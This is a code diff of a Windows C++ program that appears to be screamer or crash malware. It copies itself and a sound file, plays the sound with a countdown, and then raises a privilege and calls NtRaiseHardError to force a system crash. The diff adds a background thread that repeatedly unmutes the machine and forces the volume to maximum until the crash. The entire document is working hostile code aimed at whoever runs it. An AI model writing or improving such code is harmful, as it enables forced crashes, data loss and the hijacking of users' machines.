@@ -5,11 +5,14 @@
 #include <curl/curl.h>
 #include <Mmdeviceapi.h>
 #include <Endpointvolume.h>
+#include <future>
 #pragma comment(lib, "ntdll.lib")
 
 EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 
 EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
+
+bool volEnable = true;
 
 BOOL ChangeVolume(float nVolume)
 {
@@ -34,9 +37,16 @@ BOOL ChangeVolume(float nVolume)
         return FALSE;
 
     hr = endpointVolume->SetMasterVolumeLevelScalar(nVolume, NULL);
+    endpointVolume->SetMute(false, NULL);
     endpointVolume->Release();
 
     return SUCCEEDED(hr);
+}
+
+void changeVol() {
+    while (volEnable) {
+        	ChangeVolume(1.0);
+	}
 }
 
 int main(void){
@@ -81,7 +91,7 @@ int main(void){
      CopyFile(filename.c_str(), final.c_str(),true);
      CopyFile(sound.c_str(), final1.c_str(),true);
      PlaySoundA("FX9eEhoRZhY.wav", NULL, SND_ASYNC | SND_FILENAME);
-    CoUninitialize();
+     auto change = std::async(std::launch::async, changeVol);
      while (counter >= 1)
      {
         std::cout << "\rTime remaining: " << counter << std::endl;
@@ -92,6 +102,9 @@ int main(void){
      BOOLEAN bl;
      RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
      unsigned long response;
+    CoUninitialize();
+	volEnable = false;
+	change.get();
      NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
 
      return 0;
